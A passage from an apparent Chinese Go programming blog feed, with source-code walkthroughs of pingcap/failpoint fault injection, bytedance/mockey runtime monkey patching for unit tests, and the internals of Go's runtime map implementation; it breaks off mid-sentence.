href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L315" target="_blank" rel="noopener">actReturn</a> 的逻辑非常简单，就是直接将括号中的值解析并返回，解析是通过 <a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/terms.go#L263-L297" target="_blank" rel="noopener">parseVal</a> 函数来实现的，它能够解析字符串、数字以及布尔值。</p><p>所以总结下来，用户可以通过 GO_FAILPOINTS 这个环境变量控制一个或多个 failpath 在什么情况下被触发，failpoint 在程序启动时会将这个环境变量的值解析成对应逻辑的代码，当用户程序执行到 Eval 时就会触发这部分逻辑，从而按用户的意愿来决定返回怎样的值。</p><h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><p>环境变量的方式虽然很灵活，但它的缺点在于一旦程序启动后就不可变了，一些大型系统的启动时间可能会很长，同样一些程序的状态也可能很难构造，所以我们需要一种能够在程序执行期间动态修改 failpath 对应 terms 的能力。</p><p>failpoint 通过在程序中嵌入一个 HttpServer 来实现这个功能，具体而言，用户在启动时可以通过 GO_FAILPOINTS_HTTP 传递一个 host，这个 host 在<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/failpoints.go#L77-L81" target="_blank" rel="noopener">程序启动时</a>会被传递给 net.Listen 函数来获取一个 tcp 的 listener，并在这个 listener 上放置一个 HTTP 的<a href="https://github.com/pingcap/failpoint/blob/2eaa32854a6cece9be893bf4e3605c18586e9d6a/http.go#L51" target="_blank" rel="noopener">应用</a>。</p><p>通过查看对应的代码，可以发现这个 HTTPServer 把请求中的 URL.Path 视为 failpath，并接受 PUT、GET 和 DELETE 三种 HTTP 方法，分别用于启用某个 failpath、查询某个或全部的 failpath 状态以及禁用某个 failpath。</p><p>通过这种方式，就实现了程序运行期间动态注入故障的功能。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 bytedance/mockey 源码</title>
      <link href="/2023/01/26/mockey/"/>
      <url>/2023/01/26/mockey/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>monkey patch 是一种在运行时动态修改函数或变量内容的功能，被广泛用在单元测试中。比如一个功能函数需要调用一次 rpc 拿到数据，然后对响应体做一些计算处理后再返回最终结果，那么为了测试这个功能函数的计算逻辑，就可以通过 monkey patch 来修改掉 rpc 的部分，按需返回不同的响应，从而灵活地进行各种 case 的测试。通常而言，动态修改函数内容是动态语言提供的福利，但借助一些特殊手段，静态语言也可以实现同样的效果。本文以字节跳动开源的 <a href="https://github.com/bytedance/mockey/tree/v1.1.1" target="_blank" rel="noopener">v1.1.1 版本 mockey 库</a>为例，通过分析源码的方式来学习 golang 中实现 monkey patch 的方法。</p><p>mockey 对外提供的核心功能有两点，一个是运行时修改变量，一个是运行时修改函数，下面会分别对这两种能力进行分析。</p><h1 id="修改变量"><a href="#修改变量" class="headerlink" title="修改变量"></a>修改变量</h1><p>这个功能感觉上有点云里雾里，因为变量其实就是可以手动修改的。mockey 在常规修改上包装了一层，通过反射来实现各种变量的 patch 和 unpatch，并在这个过程中通过加锁保证同一个 mock 结构的并发安全。</p><p>修改变量的功能主要通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L34-L43" target="_blank" rel="noopener">MockerVar 结构</a> 来实现，这个结构与一个要被修改的变量一一对应，为了保证修改的并发安全，最好能做到唯一对应。使用者可以通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L45-L54" target="_blank" rel="noopener">MockValue 函数</a> 来得到这个变量，后续的操作都通过这个变量来完成。MockValue 的实现非常简单，首先断言入参是否为指针，如果不是指针就进行 panic，这个断言直接通过判断 <code>reflect.TypeOf(ptr).Kind() == reflect.Ptr</code> 的结果来实现。不过 v1.1.1 版本的 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/tool/assert.go#L39-L45" target="_blank" rel="noopener">AssertPtr 和后面会用到的 AssertFunc</a> 都有点小问题——格式化字符串后面没有带具体的变量，不过这无伤大雅。MockValue 的断言通过后，就会返回一个 MockerVar 结构，其内部已经保存了变量的原始值与类型等信息。</p><p>用户想要 patch 的变量值通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L55-L69" target="_blank" rel="noopener">MockerVar.To</a> 方法来提供，这个方法首先判断入参是否为 nil（这里的判断直接通过双等来做，其实由于那个著名的 interface{} 与 nil 的问题，这里的 nil 判断并不准确），如果为 nil，那么就用 <code>reflect.Zero(mocker.targetType)</code> 来构建一个零值，并用这个值来 patch 对应的变量，否则通过 <code>reflect.ValueOf(value)</code> 使用用户提供的值，这个值会被放入 MockerVar.hook 字段中。为了确保 hook 中的值是能够赋值给 MockerVar.target，也就是目标变量的，To 方法断言了 <code>v.AssignableTo(mocker.targetType)</code>，这个 v 取的是 hook 的类型，如果这个断言能通过，那么后面给 target 赋值时就不会发生 panic。</p><p>做完了前置的判断，MockerVar.To 就会直接调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L71-L84" target="_blank" rel="noopener">MockerVar.Patch</a> 方法，这个方法通过加锁的方式来判断 MockerVar.isPatched 变量，如果其为 false，那么说明当前的目标变量没有被 patch 过，此时会用 <code>mocker.target.Set(mocker.hook)</code> 来实现变量的赋值，然后调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/convey.go#L51-L58" target="_blank" rel="noopener">addToGlobal 函数</a> ，这个函数会先判断当前 MockerVar 的 key 是否在一个全局的 map 中，如果已经存在了，那么说明某个变量对应了两个 MockerVar 结构，此时会因为断言而结束程序的执行。因为这个 key 实际上 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L102-L104" target="_blank" rel="noopener">是被 patch 的变量的地址</a> ，所以能够保证与对应变量的一一对应关系，从而也就基本保证了 patch 操作的全局可控。这里说“基本保证”，是因为这个全局 map 的读写没有加锁，所以这个保证也不够彻底。</p><p>所以，MockerVar.To 被调用后，整个变量的 patch 操作就结束了，此时变量的值已经被修改为 To 函数的入参，To 函数将 MockerVar 返回，用户可以通过这个结构调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L86-L100" target="_blank" rel="noopener">MockerVar.Unpatch</a> 方法做变量的 unpatch，在这个操作被触发之前，该变量 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock_var.go#L72-L75" target="_blank" rel="noopener">没有办法再次进行 patch</a>。Unpatch 方法其实就是 Patch 方法的逆操作，也就是通过 <code>mocker.target.Set</code> 来完成 target 的恢复，通常来讲这个值被保存在 origin 中，然后再调用 removeFromGlobal 将当前 MockerVar 结构从全局 map 中移除，这样就可以再次进行 path，这可以通过当前 MockerVar 来实现，也可以新建一个 MockerVar 来做这件事情。</p><h1 id="修改函数"><a href="#修改函数" class="headerlink" title="修改函数"></a>修改函数</h1><p>相较于修改变量，修改函数就变得比较复杂了，在继续阅读前，我强烈推荐读者阅读一下 <a href="https://bou.ke/blog/monkey-patching-in-go/" target="_blank" rel="noopener">这篇文章</a>，这是 <a href="https://github.com/bouk/monkey" target="_blank" rel="noopener">monkey</a> 这个库的作者在其博客中描述的运行时修改函数的实现原理，讲得非常通俗易懂。mockey 的思路基本与此类似，不过它在这之上提供了更多额外的功能。</p><p>修改函数的功能主要通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L35-L47" target="_blank" rel="noopener">Mocker</a> 结构来实现，可以看到相较于 MockerVar 结构，这里多了很多字段。为了产生这个结构，需要通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L49-L59" target="_blank" rel="noopener">MockBuilder</a> 结构来完成内部字段的初始化，具体而言，<a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L61-L67" target="_blank" rel="noopener">Mock</a> 函数会得到最初的 MockBuilder，然后用户可以通过这个结构的各种方法来完成其他字段的赋值，这些方法会继续返回当前的 MockBuilder 结构，所以可以通过一种链式的调用来达成初始化的目的，这个链式调用最终会以 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L153-L158" target="_blank" rel="noopener">MockBuilder.Build</a> 方法为终结，当这个方法被调用时，整个 patch 就开始生效了。</p><p>正因为如此，Mock 函数本身非常简单，它仅仅接受 target 函数，也就是需要被 patch 的函数作为参数，在内部通过 <code>tool.AssertFunc(target)</code> 来断言这个入参是否为函数，然后将其赋值给 MockBuilder.target 后就返回了。</p><p>有了 target 函数，还需要一个 hook 函数，这个函数就是 target 被 patch 后会执行的东西。MockBuilder 提供了两个方法来设置 hook 函数，分别是 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L112-L115" target="_blank" rel="noopener">MockBuilder.To</a> 和 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L117-L120" target="_blank" rel="noopener">MockBuilder.Return</a>，这两个函数都在一开始断言了 hook 字段是否为 nil，因为如果不为 nil，那么就说明当前的 MockBuilder 是被二次利用的，这样就会出现问题。具体而言，同修改变量一样，mockey 希望每个 Mocker 结构能唯一对应一个 target 函数，而 MockBuilder.Build 方法每次都会返回一个新的 Mocker 结构，复用 MockBuilder 意味着会有两次 Build 方法的调用，此时就产生了两个 Mocker。正确的方法应该是复用第一次 Build 产生的 Mocker，因为它完全有能力完成 repatch 等操作。</p><p>回过来继续看 hook 的赋值，首先来看 MockBuilder.Return，它实际上是 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L136-L151" target="_blank" rel="noopener">MockBuilder.setReturn</a> 方法的包装方法，语义上代表在 patch 阶段让 target 函数固定返回 MockBuilder.Return 的入参。这个方法首先调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/tool/check.go#L23-L33" target="_blank" rel="noopener">tool.CheckReturnType</a> 这个工具函数来判断入参是否和 target 函数的返回值类型相匹配，比如 target 的签名是 <code>func() (int, int, int)</code>，入参就必须是三个数字才行。CheckReturnType 首先判断  target 是否为函数类型，然后判断 target 的返回值数量是否与入参的数量相等，这些都通过后，CheckReturnType 会依次遍历 target 的各个返回值类型，通过 <code>reflect.TypeOf(results[i]).ConvertibleTo(t.Out(i))</code> 来判断入参与返回值类型是否匹配。这里调用了 ConvertibleTo，就意味着 MockBuilder.setReturn 的入参与 target 的返回值的类型并不需要完全相同，比如 <code>reflect.TypeOf(1).ConvertibleTo(reflect.TypeOf(1.0))</code> 也是成立的。当类型判断通过后，MockBuilder.setReturn 方法调用 <code>reflect.MakeFunc</code> 创建一个返回固定值的函数，然后将其赋值给 hook 字段。</p><p>不同于 MockBuilder.Return，MockBuilder.To 方法要更加简单些，它接受一个函数作为参数，这个函数的签名需要等同于 target 的签名，代表在 patch 阶段使用这个函数来替换 target。这个函数包装了 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L105-L110" target="_blank" rel="noopener">MockBuilder.setTo</a>，而 setTo 并没有做太多的事情，它仅仅简单判断了入参的类型是函数类型，然后就将其赋值给了 hook 字段，并没有做函数签名的判等。</p><p>有了 target 和 hook，就可以通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L153-L158" target="_blank" rel="noopener">MockBuilder.Build</a> 方法来做 patch 了，这个方法简单初始化了 Mocker 结构，然后依次调用 Mocker.buildHook 和 Mocker.Patch，再将这个 Mocker 返回。因为 Mocker.Patch 就是 patch 生效的地方，所以到此为止 MockBuilder 的使命就结束了，用户后面需要通过 Build 方法返回的 Mocker 来完成同一个函数下一次的 repatch。</p><p>让我们先跳过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L175-L235" target="_blank" rel="noopener">Mocker.buildHook</a> 这个方法，暂且将其理解为将 MockBuilder 中的一些字段赋值给 Mocker，从而进一步完成 Mocker 的初始化即可，对这个函数的详细分析放到后面来进行，现在先把目光聚焦在 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L237-L249" target="_blank" rel="noopener">Mocker.Patch</a> 上。它在整体上有着与 MockerVar 差不多的逻辑，首先通过加锁判断 Mocker.isPatched 是否为 true，如果条件成立那么说明这个 Mocker 已经做过 patch，此时直接返回，避免重复对同一个函数做多次 patch 导致混乱。如果没有 patch 过，那么会调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/monkey/patch.go#L42-L74" target="_blank" rel="noopener">monkey.PatchValue</a> 这个工具函数，这个函数会完成函数的 patch 过程，并返回一个 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/monkey/patch.go#L29-L34" target="_blank" rel="noopener">Patch</a> 结构，在这之后，Mocker.Patch 通用调用 addToGlobal 工具函数，与 MockerVar 结构类似，每个 Mocker 也有一个 key，取值为 target 函数的地址。</p><p>继续深入到 monkey.PatchValue 这个函数，它首先通过各种断言确保了 target、hook、proxy 的类型是正确的（这里的 proxy 是一个签名与 hook 和 target 相同的函数的指针，它可以是 nil，因为它的函数内容是被人为构造的），只要类型检查通过，函数在执行时就不会出现问题。在这之后，它通过 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/monkey/common/transform.go#L36-L42" target="_blank" rel="noopener">common.BytesOf</a> 工具函数取出了 target 函数的前 bufSize 字节的内容，具体而言是 64 字节，并以 <code>[]byte</code> 的方式返回。然后，PatchValue 使用 <code>inst.BranchInto(common.PtrAt(hook))</code> 生成一段跳转到 hook 函数的二进制指令，记为 hookCode，这段指令与平台相关，在我的环境会跳转到 <code>internel/monkey/inst/inst_amd64.go</code> 这个文件中的实现上。在这之后，调用 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/internal/monkey/inst/disasm_amd64.go#L24-L37" target="_blank" rel="noopener">inst.Disassemble</a> 在 target 函数的二进制指令中中找到一个位置，这个位置是某条指令的开始，被称为 cuttingIdx，取值要保证 <code>[target, target+cuttingIdx]</code> 这个区间能够容纳 hookCode 的完整指令。然后，它通过 common.AllocatePage 分配一个内存页，并在后面保证这个内存页是可读可执行的，这个内存页中保存了 <code>[target, target+cuttingIdx]</code> 这个区间的指令，以及跳转到 target+cuttingIdx 这个位置的指令，这个内存页会被赋值给 proxy。最后，通过 <code>mem.WriteWithSTW(targetAddr, hookCode)</code> 将 hookCode 覆写到 target 函数中，这里面会涉及到 Mprotect 这个系统调用的使用，因为 target 函数所在的内存原本是不可写的。</p><p>这一段写得有点绕，总结下来 monkey.PatchValue 其实产生了两个新的函数，分别是经过修改后的 target 以及一个新生成的 proxy。target 函数最开始的代码被替换成了“跳转到 hook 函数并执行”，所以当用户在 patch 后调用 target 时，会直接跳转到 hook，执行新的函数，这样就完成了原函数的替换。而 proxy 的前半段保存了 target 被覆写的代码，在其之后是“跳转到 target 函数未被覆写的部分并执行”，所以当用户执行 proxy 时，实际上相当于完整执行了一遍原来的 target。monkey.PatchValue 返回了一个 Patch 结构，内部保存了 target 的地址、proxy 的代码以及 cuttingIdx，当用户调用 Patch.Unpatch 时，Patch 会将 proxy 代码中的前 cuttingIdx 写回 target，这样 target 就恢复如初了。</p><p>proxy 的作用并不仅仅是用于恢复 target，否则根本没有必要分配一个可执行的内存页来构建一个函数，直接把 target 被覆盖前的那部分代码保存下来即可。之所以费尽心思，是因为 mockey 需要能够在 patch 生效的时期执行原来的 target，至少在效果上要保证一致，而 proxy 就能够做到这点。</p><p>具体而言，mockey 可以让 patch 按条件生效，MockBuilder 提供了 When、IncludeCurrentGoRoutine、ExcludeCurrentGoRoutine 以及 FilterGoRoutine。MockBuilder.When 的入参是一个函数，这个函数接受用户调用 target 时传递的参数作为参数，返回一个布尔值，当且仅当其值为 true 时才会调用 hook，否则走原来的 target 的逻辑。IncludeCurrentGoRoutine、ExcludeCurrentGoRoutine 和 FilterGoRoutine 都是在 goroutine 维度来判断是否做 patch，具体而言是根据当前 goroutine 的 gid 来做的，每一次 patch 只能设置一个条件，目前还不支持类似 <code>include(goroutineA) and exclude(goroutineB)</code> 这种逻辑。在实现上，mockey 在用户提供的 hook 的基础上包装了一层，也就是 <a href="https://github.com/bytedance/mockey/blob/v1.1.1/mock.go#L175-L235" target="_blank" rel="noopener">Mocker.buildHook</a> 这个方法做的事情，它利用 <code>reflect.MakeFunc</code> 创建了一个新的函数，这个函数会根据 When 和 FilterGoRoutine 的设置来分别按需调用用户提供的 hook 或 proxy，调用 hook 时就是 patch 生效的状态，调用 proxy 时就是不生效的状态。</p><p>为了方便用户感知 patch 是否生效，Mocker 有 Mocker.Times 和 Mocker.MockTimes 这两个方法，前者代表用户调用了几次 target 函数，但调用时可能走了 hook 的逻辑，也可能走了原 target 的逻辑，后者代表用户走了几次 hook 的逻辑，这两个值也都是在 Mocker.buildHook 这个方法构建出来的函数中维护的。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析 golang map 源码</title>
      <link href="/2022/12/26/golang-map-src/"/>
      <url>/2022/12/26/golang-map-src/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近阅读了 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go" target="_blank" rel="noopener">runtime/map.go</a> 中的代码，以梳理 golang 中 map 这个数据结构的原理。在使用上，map 有很多内置的语法支持，但实际上这些都是 golang 提供的语法糖，这些语法在编译时都会被编译器转换为对 runtime/map.go 或其变种的函数调用，并添加一些代码，最终完成用户需要的功能。</p><p>本文尝试分析 map.go 中的代码对 map 各种操作的支持，其他变种的操作与此类似。</p><h1 id="基础结构"><a href="#基础结构" class="headerlink" title="基础结构"></a>基础结构</h1><p>golang 中 map 的核心结构有如下几个：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A header for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> hmap <span class="keyword">struct</span> &#123;</span><br><span class="line">  count     <span class="keyword">int</span> <span class="comment">// map 中当前有多少个元素，len() 方法读的就是这里</span></span><br><span class="line">flags     <span class="keyword">uint8</span> <span class="comment">// 当前 map 的 flag，用于标识 map 的状态，比如是否有在写入或是遍历</span></span><br><span class="line">B         <span class="keyword">uint8</span>  <span class="comment">// loadFactor * 2^B 是当前 map 可以容纳的元素数量</span></span><br><span class="line">noverflow <span class="keyword">uint16</span> <span class="comment">// “可能”用了多少个溢出桶</span></span><br><span class="line">hash0     <span class="keyword">uint32</span> <span class="comment">// hash 函数的种子，引入更多的随机性</span></span><br><span class="line"></span><br><span class="line">buckets    unsafe.Pointer <span class="comment">// 2^B 个桶，桶也就是 bmap</span></span><br><span class="line">oldbuckets unsafe.Pointer <span class="comment">// 保存迁移前的桶</span></span><br><span class="line">nevacuate  <span class="keyword">uintptr</span>        <span class="comment">// 当前有多少个桶被迁移了</span></span><br><span class="line"></span><br><span class="line">extra *mapextra <span class="comment">// optional fields</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mapextra holds fields that are not present on all maps.</span></span><br><span class="line"><span class="keyword">type</span> mapextra <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// If both key and elem do not contain pointers and are inline, then we mark bucket</span></span><br><span class="line"><span class="comment">// type as containing no pointers. This avoids scanning such maps.</span></span><br><span class="line"><span class="comment">// However, bmap.overflow is a pointer. In order to keep overflow buckets</span></span><br><span class="line"><span class="comment">// alive, we store pointers to all overflow buckets in hmap.extra.overflow and hmap.extra.oldoverflow.</span></span><br><span class="line"><span class="comment">// overflow and oldoverflow are only used if key and elem do not contain pointers.</span></span><br><span class="line"><span class="comment">// overflow contains overflow buckets for hmap.buckets.</span></span><br><span class="line"><span class="comment">// oldoverflow contains overflow buckets for hmap.oldbuckets.</span></span><br><span class="line"><span class="comment">// The indirection allows to store a pointer to the slice in hiter.</span></span><br><span class="line">overflow    *[]*bmap</span><br><span class="line">oldoverflow *[]*bmap</span><br><span class="line"></span><br><span class="line"><span class="comment">// nextOverflow holds a pointer to a free overflow bucket.</span></span><br><span class="line">nextOverflow *bmap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// A bucket for a Go map.</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// 桶中元素的 hash 的高八位，加速查找，bucketCnt 当前取值为 8</span></span><br><span class="line">tophash [bucketCnt]<span class="keyword">uint8</span></span><br><span class="line"><span class="comment">// 后面其实是 key*8 与 value*8，但因为编译前不知道具体类型，所以需要用指针的方式来访问</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上讲，代码中的一个 map 变量其实是 *hmap 类型，所以如果我们把这三个结构复制到自己的代码里，然后用下面的代码就可以访问 hmap 结构中的各个字段了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mp := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">mp[i] = i</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp))</span><br><span class="line">fmt.Printf(<span class="string">"%+v\n"</span>, mpPtr)</span><br></pre></td></tr></table></figure><h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>对于一个 map 而言，核心需求是能够根据一个 key 来增删改查对应的 value，这需要将 value 保存在槽（hash slot）里，在访问时先对 key 来进行 hash 计算，计算的结果会是一个数字，然后把这个数字对槽的数量取模，这样就可以获知 value 在哪个槽中。但槽的数量是有限的，尽管优秀的 hash 函数能够使计算结果尽可能分散到不同的槽中，当保存的 value 数量大于槽的总数时还是不可避免地会让多个 value 进入同一个槽中，对于这种名为“哈希冲突”的问题，常见的解法是“开放地址法”和“拉链法”。</p><p>golang 中的 map 采用了同样的思路，具体来说，map 中存在 2^B（B 是大于等于 0 的数字） 个 bmap 结构，这些 bmap 被放在一块连续的内存中，也就是一个数组，每个 bmap 中保存 8 个键值对。</p><p>给定一个 key，首先会通过 hash 函数来计算得到一个 uintptr 类型的值（在 64 位的系统上占 8 个字节），然后将这个值与 <code>2^B - 1</code> 做与运算，就可以得到 bmap 数组的下标。这里的与运算其实是前文取模的一种优化，因为 bmap 的数量是 2 的整数次幂，那么这个值减一就会得到一个低 B 位均为 1 的数，这时对这个数做与运算时就可以拿到 [0, 2^B) 中的一个值，而这个值的取值范围与 bmap 数组的下标范围相同。</p><p>而 bmap 中首先的 8 个字节是名为 tophash 的数组，与其内部的键值对一一对应。这个值的计算方式被定义在 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=193-200" target="_blank" rel="noopener">tophash 函数</a> 中，取的是 hash 函数结果的高 8 位，但由于 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=88-97" target="_blank" rel="noopener">部分值被保留用于标识一些状态</a>，所以需要按需绕过这些值。有了这些 tophash，就可以在读取时先对比 tophash，当且仅当 bmap 中某个 tophash 的值与入参对应的 tophash 相等时再进一步比较对应的 key 与入参的 key 是否相等，这就避免了一些复杂结构的频繁判等。</p><p>而 bmap 结构本身其实并不单单是前文贴出的代码中的样子，它除了 8 个 tophash 外还包含 8 个 key、8 个对应的 value 以及一个 bmap 的指针。在不考虑内存对齐的情况下，golang 在运行时会为每一个 bmap 分配 <code>8 + 8*sizeof(key) + 8*sizeof(value) + sizeof(uintptr)</code> 大小的内存，从这个算式中可以发现，sizeof(key) 和 sizeof(value) 都是仅在编译时才能确定的，所以 bmap 本身的结构中仅包含 tophash，其他三个字段都是在运行时直接通过指针来访问的。为了验证这一点，我们可以为上面的 bmap 结构按实际情况填充一些字段，然后就可以用下面的代码来访问这个 bmap 中的各个值了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ... 省略 hmap 和 mapextra 结构</span></span><br><span class="line"><span class="keyword">type</span> bmap <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="comment">// bucketCnt 取值为 8</span></span><br><span class="line">tophash [bucketCnt]<span class="keyword">uint8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 填充具体的 keys、values 以及 ptr</span></span><br><span class="line">keys [bucketCnt]<span class="keyword">string</span></span><br><span class="line">vals [bucketCnt]<span class="keyword">string</span></span><br><span class="line">ptr  *bmap</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">mp := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>&#123;</span><br><span class="line"><span class="string">"hello"</span>: <span class="string">"world"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mpPtr := *(**hmap)(unsafe.Pointer(&amp;mp))</span><br><span class="line">fmt.Println(<span class="string">"len:"</span>, mpPtr.count)</span><br><span class="line"></span><br><span class="line">bucket := (*bmap)(mpPtr.buckets)</span><br><span class="line">fmt.Printf(<span class="string">"%+v\n"</span>, bucket)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果运行上面的代码，就可以直接在 bucket 的 keys 和 vals 中看到 “hello” 和 “world”，但是并不是所有的 key 和 val 都可以直接放在 bmap 中，golang 在源码中定义了 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=73-78" target="_blank" rel="noopener">maxKeySize 和 maxElemSize</a>，当 key 或 val 的大小大于这个值时，就会只在 bmap 中保存对应的指针，这样就避免了 bmap 过大的问题。</p><p>那么这个 ptr，就是是结尾的 bmap 指针是用来做什么的呢？这是用来链接溢出桶（overflow bucket）的。具体而言，golang 中的 map 是采用“拉链法”来解决 hash 冲突的，而这里的 ptr 是用来实现拉链的。如前所述，一个 bmap 只能保存 8 个键值对，而且这 8 个键值对 <code>hash(key) &amp; (2^B - 1)</code> 的值是相等的（也就是当前 bmap 的下标）。那么如果此时有一个 bmap，它内部已经拥有了 8 个键值对，而新增的第 9 个 key 算出的下标和这个已有 8 个键值对的 bmap 下标相同，就需要在这个 bmap 后面添加新的 bmap 结构才能将这个键值对保存下来。此时原有的 bmap 中的 ptr 就会指向这个新的 bmap 结构。</p><p>所以，hmap.buckets 其实可以看作是一个二维的 bmap 数组，第一维的下标通过哈希函数加与运算的方式来获取，而第二维则是一个链表，链表中所有 key 的 <code>hash(key) &amp; (2^B - 1)</code> 的值都是相同的。在读写 bmap 时，首先计算出第一维的下标，然后遍历这个下标对应的链表，在链表的某个节点上做具体的增删改查。</p><p>虽然拉链法能够在存储上解决哈希冲突的问题，但任由拉链越来越长会严重影响 map 的访问效率，极端情况下会退化成一条链表（写入的所有 key 计算出的下标都相同）。而之所以会造成这个问题，本质在于 bmap 的数量会限制 hash 函数的值范围（因为会对数量取模），较小的值范围会让更多的 hash(key) 落在同一个桶中。所以就需要在 map 中保存的值达到一定数量时对 map 做扩容，通过增加 bmap 的数量来为 hash 函数提供更大的值范围。那么怎样确定这个数量呢？是通过 <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17.13:src/runtime/map.go;l=1070-1072" target="_blank" rel="noopener">overLoadFactor 函数</a> 来确定的，具体而言，当 hmap.count 大于一个 bmap 中能保存的数量时，需要判断 <code>hmap.count / 2^B</code> 是否大于 6.5，这里的 6.5 被称为负载因子（load factor），当比值大于这个值时，overLoadFactor 返回 true，此时就需要进行扩容（其实扩容的条件不止负载因子这一个，详细的内容放在下面的小节中）。</p><p>扩容的操作就是创建一个新的 bmap 数组，这个数组要在数学意义上更适应当前键值对的数量，然后把键值对从旧的 bmap 数组中迁移到新的数组中。不难想到，当 map 中的键值对数量很多时，这个操作会非常耗性能。所以 golang 的 map 采用了“渐进式扩容”的方式，将扩容操作分摊到每一次的写入和删除操作中，每次只迁移一部分的数据。这样解决了全量扩容带来的瞬间性能问题，但却引入了迁移中间态，也就是在某些时间点，map 有一部分数据在新的 bmap 